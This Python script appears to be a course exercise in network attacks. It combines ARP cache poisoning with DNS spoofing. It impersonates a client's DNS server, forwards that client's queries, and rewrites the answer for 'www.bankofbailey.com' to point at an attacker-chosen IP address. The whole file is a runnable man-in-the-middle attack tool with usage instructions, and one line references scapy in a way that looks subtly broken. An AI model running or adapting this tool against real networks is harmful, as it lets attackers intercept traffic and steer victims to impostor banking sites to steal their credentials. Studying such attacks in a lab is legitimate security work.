import argparse
import atexit
import base64

from scapy.all import ARP, Ether, DNS, IP, UDP, TCP, DNS
from scapy.all import conf, get_if_hwaddr, srp1, send, sendp, sniff, packet


class MyArpSpoofing:
    MALICIOUS_DNS = [("www.bankofbailey.com", "10.4.63.200")]

    def __init__(self, interface, client_ip, dns_ip):
        # set scapy config
        conf.iface = self.interface = interface
        # set mac/ip
        self.attacker_ip = [e[4] for e in scapy.all.conf.route.routes if e[3] == interface][0]
        self.attacker_mac = get_if_hwaddr(interface)
        self.client_ip = client_ip
        self.client_mac = self._get_mac_by_ip(target_ip=client_ip)
        self.dns_ip = dns_ip
        self.dns_mac = self._get_mac_by_ip(target_ip=dns_ip)
        # resume client's arp cache on exit
        atexit.register(self._resume_client_arp_cache)

    def run(self):
        """(blocking) sniff and manipulate target packet"""
        self._poison_client_arp_cache()

        def interceptor(p):
            """handler of intercepted packets"""
            # APR packet
            if p.haslayer(ARP) and p[ARP].op == 1:
                self._poison_client_arp_cache()
            # UDP/DNS packet
            elif p.haslayer(DNS) and p[IP].dst == self.dns_ip:
                self._mitm_dns_proxy(p=p, timeout=2)

        # run
        print("# start sniffing...")
        f = f"ether src {self.client_mac}"
        sniff(prn=interceptor, filter=f, count=65536)

    def _poison_client_arp_cache(self, verbose=True):
        """poison client's arp cache"""
        spoof_dns_arp = ARP(op=2, hwdst=self.client_mac, pdst=self.client_ip, psrc=self.dns_ip)
        send(spoof_dns_arp, verbose=False)
        if verbose is True:
            print("# ARP Cache is poisoned!")

    def _resume_client_arp_cache(self, verbose=True):
        """resume client's arp cache """
        normal_dns_arp = ARP(op=2, hwdst=self.client_mac, pdst=self.client_ip, psrc=self.dns_ip, hwsrc=self.dns_mac)
        send(normal_dns_arp, verbose=False)
        if verbose is True:
            print("# ARP Cache is resumed!")

    def _mitm_dns_proxy(self, p, timeout=5):
        """proxy and manipulate dns query/response between client and dns server"""
        # forward dns request from client
        hostname = p[DNS].qd.qname.decode(encoding='ascii')[:-1]
        fake_dns_req = Ether() / IP(dst=self.dns_ip) / UDP(dport=p[UDP].dport) / p[DNS]
        res = srp1(fake_dns_req, verbose=False, timeout=timeout)
        # forward dns response from dns server
        if res is not None:
            layer_23 = Ether() / IP(dst=self.client_ip, src=self.dns_ip)
            udp = UDP(dport=p[UDP].sport)
            dns = res[DNS]
            for e in self.MALICIOUS_DNS:
                target_host, ip = e[0], e[1]
                if hostname == target_host:
                    dns.an.rdata = ip
                    sendp(layer_23 / udp / dns, verbose=False)
                    print(f"# resolve {hostname} to {dns.an.rdata} for the client")

    def _get_mac_by_ip(self, target_ip):
        """get mac address of an IP by arp query """
        ether = Ether(src=self.attacker_mac, dst="ff:ff:ff:ff:ff:ff")  # ff:ff:ff:ff:ff:ff is the addr for broadcast
        arp_packet = ARP(op=1, hwsrc=self.attacker_mac, psrc=self.attacker_ip, pdst=target_ip)
        arp_response = srp1(ether / arp_packet, verbose=False)
        return arp_response.src


class MyUtil:

    @staticmethod
    def get_args():
        """parse terminal args"""
        parser = argparse.ArgumentParser()
        parser.add_argument("-i", dest="i", required=True)
        parser.add_argument("--clientIP", dest="c", required=True)
        parser.add_argument("--dnsIP", dest="d", required=True)
        args = parser.parse_args()
        # return
        interface = args.i
        client_ip = args.c
        dns_ip = args.d
        return interface, client_ip, dns_ip


if __name__ == "__main__":
    """example command: python3 pp.py -i eth0 --clientIP 10.4.22.53 --dnsIP 10.4.22.247"""
    INTERFACE, CLIENT_IP, DNS_IP = MyUtil.get_args()
    # print report
    arpSpoofing = MyArpSpoofing(interface=INTERFACE, client_ip=CLIENT_IP, dns_ip=DNS_IP)
    print(f"# ")
    print(f"# ==================== running 4-2-2.py ====================")
    print(f"#")
    print(f"# args")
    print(f"#   INTERFACE : {INTERFACE}")
    print(f"#   CLIENT_IP : {CLIENT_IP}")
    print(f"#   DNS_IP    : {DNS_IP}")
    print(f"#")
    print(f"# Normal MAC/IP Mapping")
    print(f"#   Attacker : {arpSpoofing.attacker_mac}{' ' * 4}{arpSpoofing.attacker_ip}")
    print(f"#   Client   : {arpSpoofing.client_mac}{' ' * 4}{arpSpoofing.client_ip}")
    print(f"#   DNS      : {arpSpoofing.dns_mac}{' ' * 4}{arpSpoofing.dns_ip}")
    print(f"# ==========================================================")
    # run
    arpSpoofing.run()
